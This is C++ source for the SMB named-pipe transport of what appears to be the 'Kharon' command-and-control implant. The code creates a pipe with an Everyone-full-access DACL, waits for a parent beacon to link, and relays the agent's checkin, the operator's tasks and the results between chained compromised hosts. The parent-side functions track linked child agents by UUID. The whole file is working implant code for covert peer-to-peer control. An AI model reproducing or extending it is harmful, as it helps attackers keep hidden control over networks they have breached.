#include <Kharon.h>

auto Transport::SmbAdd(
    _In_ CHAR* NamedPipe,
    _In_ PVOID Parser,
    _In_ PVOID Package
) -> PVOID {
    SMB_PROFILE_DATA* SmbData = nullptr;

    BOOL   Success = FALSE;
    ULONG  BuffLen = 0;
    BYTE*  Buffer  = nullptr;

    HANDLE Handle  = Self->Krnl32.CreateFileA(
        NamedPipe, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr
    );
    if ( Handle == INVALID_HANDLE_VALUE || ! Handle ) {
        KhDbg( "named pipe not found: %d", KhGetError ); return nullptr;
    }

    // Wait for child to write data (child writes [4B length][payload] after ConnectNamedPipe)
    ULONG retries = 0;
    while ( retries < 50 ) {
        if ( Self->Krnl32.PeekNamedPipe( Handle, nullptr, 0, 0, &BuffLen, 0 ) ) {
            if ( BuffLen >= sizeof( ULONG ) ) {
                Self->Ntdll.DbgPrint( "[SMB] SmbAdd: %d bytes available from pipe\n", BuffLen );
                break;
            }
        }
        Self->Krnl32.Sleep( 100 );
        retries++;
    }

    if ( BuffLen < sizeof( ULONG ) ) {
        Self->Ntdll.DbgPrint( "[SMB] SmbAdd: no data from pipe after retries\n" );
        Self->Ntdll.NtClose( Handle );
        return nullptr;
    }

    // Read entire message at once (PIPE_TYPE_MESSAGE sends [4B len][payload] as single message)
    Buffer = (BYTE*)KhAlloc( BuffLen );
    ULONG BytesRead = 0;
    if ( ! Self->Krnl32.ReadFile( Handle, Buffer, BuffLen, &BytesRead, nullptr ) ) {
        Self->Ntdll.DbgPrint( "[SMB] SmbAdd: ReadFile failed: %d\n", KhGetError );
        KhFree( Buffer );
        Self->Ntdll.NtClose( Handle );
        return nullptr;
    }

    Self->Ntdll.DbgPrint( "[SMB] SmbAdd: read %d bytes total message\n", BytesRead );

    // Extract payload: skip first 4 bytes (length prefix)
    if ( BytesRead <= sizeof(ULONG) ) {
        Self->Ntdll.DbgPrint( "[SMB] SmbAdd: message too small\n" );
        KhFree( Buffer );
        Self->Ntdll.NtClose( Handle );
        return nullptr;
    }

    ULONG PayloadLen = BytesRead - sizeof(ULONG);
    PBYTE PayloadBuf = (PBYTE)KhAlloc( PayloadLen );
    Mem::Copy( PayloadBuf, Buffer + sizeof(ULONG), PayloadLen );
    KhFree( Buffer );
    Buffer = PayloadBuf;
    BuffLen = PayloadLen;

    Self->Ntdll.DbgPrint( "[SMB] SmbAdd: read %d bytes payload (UUID starts: %c%c%c%c)\n",
        BuffLen, Buffer[0], Buffer[1], Buffer[2], Buffer[3] );

    CHAR* TmpUUID = (CHAR*)KhAlloc( 36+1 );

    Mem::Copy( TmpUUID, Buffer, 36 );

    KhDbg( "parsed uuid: %s", TmpUUID );

    SmbData = (SMB_PROFILE_DATA*)KhAlloc( sizeof( SMB_PROFILE_DATA ) );

    SmbData->Handle    = Handle;
    SmbData->SmbUUID   = TmpUUID;
    SmbData->AgentUUID = TmpUUID;

    // Store the pipe path for reference (handle is persistent, no reconnection needed)
    ULONG PathLen = Str::LengthA( NamedPipe ) + 1;
    SmbData->PipePath = (CHAR*)KhAlloc( PathLen );
    Mem::Copy( SmbData->PipePath, NamedPipe, PathLen );

    SmbData->Pkg = (PACKAGE*)KhAlloc( sizeof( PACKAGE ) );
    SmbData->Psr = (PARSER*)KhAlloc( sizeof( PARSER ) );

    SmbData->Pkg->Buffer  = Buffer;
    SmbData->Pkg->Length  = BuffLen;
    SmbData->Pkg->Size    = BuffLen;
    SmbData->Pkg->Encrypt = FALSE;

    SmbData->Next = nullptr;

    if ( ! this->Pipe.Node ) {
        this->Pipe.Node = SmbData;
    } else {
        SMB_PROFILE_DATA* Current = static_cast<SMB_PROFILE_DATA*>( this->Pipe.Node );

        while ( Current->Next ) {
            Current = Current->Next;
        }

        Current->Next = SmbData;
    }

    return SmbData;
}

auto Transport::SmbRm(
    _In_ PVOID SmbDataPtr
) -> BOOL {
    if ( ! SmbDataPtr || ! this->Pipe.Node ) return FALSE;

    SMB_PROFILE_DATA* Target  = static_cast<SMB_PROFILE_DATA*>( SmbDataPtr );
    SMB_PROFILE_DATA* Current = static_cast<SMB_PROFILE_DATA*>( this->Pipe.Node );
    SMB_PROFILE_DATA* Prev    = nullptr;

    while ( Current ) {
        if ( Current == Target ) {
            // Unlink from list
            if ( Prev ) {
                Prev->Next = Current->Next;
            } else {
                this->Pipe.Node = Current->Next;
            }

            // Close the pipe handle
            if ( Current->Handle ) {
                Self->Ntdll.NtClose( Current->Handle );
            }

            // Free allocated memory
            if ( Current->SmbUUID ) {
                KhFree( Current->SmbUUID );
            }
            if ( Current->Pkg ) {
                if ( Current->Pkg->Buffer ) {
                    KhFree( Current->Pkg->Buffer );
                }
                KhFree( Current->Pkg );
            }
            if ( Current->Psr ) {
                KhFree( Current->Psr );
            }
            KhFree( Current );

            return TRUE;
        }

        Prev    = Current;
        Current = Current->Next;
    }

    return FALSE;
}

auto Transport::SmbList(
    VOID
) -> PVOID {
    return this->Pipe.Node;
}

auto Transport::SmbGet(
    _In_ CHAR* SmbUUID
) -> PVOID {
    if ( ! SmbUUID || ! this->Pipe.Node ) return nullptr;

    SMB_PROFILE_DATA* Current = static_cast<SMB_PROFILE_DATA*>( this->Pipe.Node );

    while ( Current ) {
        ULONG matchLen = Str::LengthA( SmbUUID );
        if ( Current->SmbUUID && Mem::Cmp( (PBYTE)Current->SmbUUID, (PBYTE)SmbUUID, matchLen ) ) {
            return Current;
        }
        Current = Current->Next;
    }

    return nullptr;
}

#if PROFILE_C2 == PROFILE_SMB
auto Transport::SmbSend(
    _In_      MM_INFO* SendData,
    _Out_opt_ MM_INFO* RecvData
) -> BOOL {

    Self->Ntdll.DbgPrint( "[SMB] SmbSend called, Pipe.Name=%s, Pipe.Handle=%p, TasksRead=%d\n",
        this->Pipe.Name ? this->Pipe.Name : "(null)", this->Pipe.Handle, this->Pipe.TasksRead );

    // =====================================================================
    // PHASE 1: Pipe creation + parent connection (only when no handle)
    // =====================================================================
    if ( ! this->Pipe.Handle ) {
        SECURITY_ATTRIBUTES* SecAttr = (SECURITY_ATTRIBUTES*)KhAlloc( sizeof( SECURITY_ATTRIBUTES ) );
        SECURITY_DESCRIPTOR* SecDesc = (SECURITY_DESCRIPTOR*)KhAlloc( SECURITY_DESCRIPTOR_MIN_LENGTH );

        SID_IDENTIFIER_AUTHORITY SidAuth  = SECURITY_WORLD_SID_AUTHORITY;
        EXPLICIT_ACCESSA         Access   = { 0 };

        SID* Sid  = nullptr;
        ACL* DAcl = nullptr;

        Self->Advapi32.AllocateAndInitializeSid( &SidAuth, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, (PSID*)&Sid );

        Access.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
        Access.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
        Access.Trustee.ptstrName    = (CHAR*)Sid;
        Access.grfAccessMode        = SET_ACCESS;
        Access.grfInheritance       = NO_INHERITANCE;
        Access.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;

        Self->Advapi32.SetEntriesInAclA( 1, &Access, nullptr, &DAcl );

        Self->Advapi32.InitializeSecurityDescriptor( SecDesc, SECURITY_DESCRIPTOR_REVISION );

        Self->Advapi32.SetSecurityDescriptorDacl( SecDesc, TRUE, DAcl, FALSE );

        SecAttr->bInheritHandle       = FALSE;
        SecAttr->nLength              = sizeof( SECURITY_ATTRIBUTES );
        SecAttr->lpSecurityDescriptor = SecDesc;

        this->Pipe.Handle = Self->Krnl32.CreateNamedPipeA(
            this->Pipe.Name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_LENGTH, PIPE_BUFFER_LENGTH, 0, SecAttr
        );

        if ( this->Pipe.Handle == INVALID_HANDLE_VALUE || ! this->Pipe.Handle ) {
            Self->Ntdll.DbgPrint( "[SMB] CreateNamedPipeA FAILED: error=%d, name=%s\n", KhGetError,
                this->Pipe.Name ? this->Pipe.Name : "(null)" );
            this->Pipe.Handle = nullptr;
            return FALSE;
        }

        Self->Ntdll.DbgPrint( "[SMB] Pipe created OK: %s, handle=%p\n", this->Pipe.Name, this->Pipe.Handle );

        // Wait for parent beacon to connect (blocks until link command)
        Self->Ntdll.DbgPrint( "[SMB] Waiting for parent to connect...\n" );

        if ( ! Self->Krnl32.ConnectNamedPipe( this->Pipe.Handle, nullptr ) ) {
            if ( KhGetError != ERROR_PIPE_CONNECTED ) {
                Self->Ntdll.DbgPrint( "[SMB] ConnectNamedPipe failed: %d\n", KhGetError );
                goto pipe_error;
            }
        }

        Self->Ntdll.DbgPrint( "[SMB] Parent connected!\n" );

        // FIRST CHECKIN: write checkin data, keep pipe open
        if ( ! Self->Session.Connected ) {
            if ( SendData && SendData->Ptr && SendData->Size > 0 ) {
                ULONG WriteLen = 0;
                ULONG DataLen  = (ULONG)SendData->Size;

                ULONG TotalLen = sizeof(ULONG) + DataLen;
                PBYTE CombinedBuf = (PBYTE)KhAlloc( TotalLen );
                Mem::Copy( CombinedBuf, &DataLen, sizeof(ULONG) );
                Mem::Copy( CombinedBuf + sizeof(ULONG), SendData->Ptr, DataLen );

                if ( ! Self->Krnl32.WriteFile( this->Pipe.Handle, CombinedBuf, TotalLen, &WriteLen, nullptr ) ) {
                    Self->Ntdll.DbgPrint( "[SMB] Checkin WriteFile failed: %d\n", KhGetError );
                    KhFree( CombinedBuf );
                    goto pipe_error;
                }
                KhFree( CombinedBuf );

                Self->Ntdll.DbgPrint( "[SMB] Wrote %d bytes checkin — pipe stays open\n", DataLen );
            }

            // Pipe stays open — next Dispatcher cycle will read first tasks
            this->Pipe.TasksRead = FALSE;
            return TRUE;
        }
    }

    // =====================================================================
    // PHASE 2: Persistent handle — alternating read/write via TasksRead flag
    //   Call 1 (TasksRead=FALSE): READ tasks from parent
    //   Call 2 (TasksRead=TRUE):  WRITE results to parent
    // =====================================================================

    // --- CALL 2: Write results ---
    if ( this->Pipe.TasksRead ) {
        Self->Ntdll.DbgPrint( "[SMB] Call 2: writing results on persistent pipe\n" );

        if ( SendData && SendData->Ptr && SendData->Size > 0 ) {
            ULONG WriteLen = 0;
            ULONG DataLen  = (ULONG)SendData->Size;

            ULONG TotalLen = sizeof(ULONG) + DataLen;
            PBYTE CombinedBuf = (PBYTE)KhAlloc( TotalLen );
            Mem::Copy( CombinedBuf, &DataLen, sizeof(ULONG) );
            Mem::Copy( CombinedBuf + sizeof(ULONG), SendData->Ptr, DataLen );

            if ( ! Self->Krnl32.WriteFile( this->Pipe.Handle, CombinedBuf, TotalLen, &WriteLen, nullptr ) ) {
                Self->Ntdll.DbgPrint( "[SMB] Call 2: WriteFile failed: %d\n", KhGetError );
                KhFree( CombinedBuf );
                goto pipe_error;
            }
            KhFree( CombinedBuf );

            Self->Ntdll.DbgPrint( "[SMB] Call 2: wrote %d bytes results\n", DataLen );
        }

        // Pipe stays open — next cycle Call 1 will read new tasks
        this->Pipe.TasksRead = FALSE;
        return TRUE;
    }

    // --- CALL 1: Read tasks ---
    {
        Self->Ntdll.DbgPrint( "[SMB] Call 1: reading tasks from parent...\n" );

        // PeekNamedPipe loop — wait for parent to write tasks.
        // No fixed retry limit: the child waits as long as needed (parent controls timing).
        // PeekNamedPipe returns FALSE if pipe is broken → triggers error recovery.
        ULONG MsgLen = 0;
        while ( TRUE ) {
            if ( ! Self->Krnl32.PeekNamedPipe( this->Pipe.Handle, nullptr, 0, 0, &MsgLen, 0 ) ) {
                Self->Ntdll.DbgPrint( "[SMB] Call 1: PeekNamedPipe failed (pipe broken): %d\n", KhGetError );
                goto pipe_error;
            }
            if ( MsgLen >= sizeof(ULONG) ) break;
            Self->Krnl32.Sleep( 100 );
        }

        PBYTE MsgBuf = (PBYTE)KhAlloc( MsgLen );
        if ( ! MsgBuf ) goto pipe_error;
        ULONG ReadLen = 0;
        if ( ! Self->Krnl32.ReadFile( this->Pipe.Handle, MsgBuf, MsgLen, &ReadLen, nullptr ) ) {
            Self->Ntdll.DbgPrint( "[SMB] Call 1: ReadFile failed: %d\n", KhGetError );
            KhFree( MsgBuf );
            goto pipe_error;
        }

        // Extract payload: skip 4-byte length prefix
        ULONG TaskLen = ReadLen - sizeof(ULONG);
        PBYTE TaskBuf = (PBYTE)KhAlloc( TaskLen );
        Mem::Copy( TaskBuf, MsgBuf + sizeof(ULONG), TaskLen );
        KhFree( MsgBuf );

        // Prepend 36-byte dummy UUID prefix so Parser::NewTask's Pad(36) works correctly.
        // NewTask always skips first 36 bytes (UUID from HTTP response). SMB data has no UUID.
        ULONG PrefixedLen = 36 + TaskLen;
        PBYTE PrefixedBuf = (PBYTE)KhAlloc( PrefixedLen );
        Mem::Zero( U_PTR(PrefixedBuf), 36 );
        Mem::Copy( PrefixedBuf + 36, TaskBuf, TaskLen );
        KhFree( TaskBuf );

        if ( RecvData ) {
            RecvData->Ptr  = PrefixedBuf;
            RecvData->Size = PrefixedLen;
        }

        Self->Ntdll.DbgPrint( "[SMB] Call 1: read %d bytes tasks (prefixed to %d)\n", TaskLen, PrefixedLen );

        // Mark tasks as read — next SmbSend call will be Call 2 (write results)
        this->Pipe.TasksRead = TRUE;
        return TRUE;
    }

pipe_error:
    // Error recovery: disconnect, close, and reset.
    // Next Dispatcher cycle will recreate the pipe and wait for a new parent.
    Self->Ntdll.DbgPrint( "[SMB] Pipe error — disconnecting and resetting\n" );
    if ( this->Pipe.Handle ) {
        Self->Krnl32.DisconnectNamedPipe( this->Pipe.Handle );
        Self->Ntdll.NtClose( this->Pipe.Handle );
    }
    this->Pipe.Handle    = nullptr;
    this->Pipe.TasksRead = FALSE;
    return FALSE;
}
#endif
